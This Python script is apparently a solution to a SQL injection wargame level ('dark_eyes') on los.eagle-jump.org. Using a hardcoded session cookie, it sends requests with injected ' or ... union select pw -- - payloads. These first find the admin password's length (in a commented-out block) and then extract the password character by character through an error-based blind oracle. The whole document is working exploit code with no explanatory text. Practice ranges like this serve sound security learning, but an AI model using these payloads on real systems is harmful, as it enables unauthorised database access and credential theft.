import requests
import string

choice=string.digits+string.ascii_letters
url="https://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php"
headers={'Cookie': 'PHPSESSID=6i0t96to2iolseq897vqa2j556'}
'''
for i in range(1,100):
    param="?pw=' or (id)='admin' and (select length(pw)="+str(i)+") and (select 1 union select pw)-- -"
    page=url +param
    res=requests.get(page,headers=headers)
    if ("select") not in res.text:
        print("success"+str(i))
        break

    else:
        print(str(i)+"....flop")
'''
passwd=''
for i in range (1,9):
    for j in choice:
        param="?pw='||id='admin' and (select (substr(pw,1,"+str(i)+"))='"+(passwd+j)+"') and (select 1 union select pw)-- -"
        base=url+param
        page=requests.get(base,headers=headers) 
        print("trying :: "+str(i)+"-_-"+ (passwd+j))
        if "select" not in page.text:
            print(base)
            passwd=passwd+(j)
            print(passwd)
            break

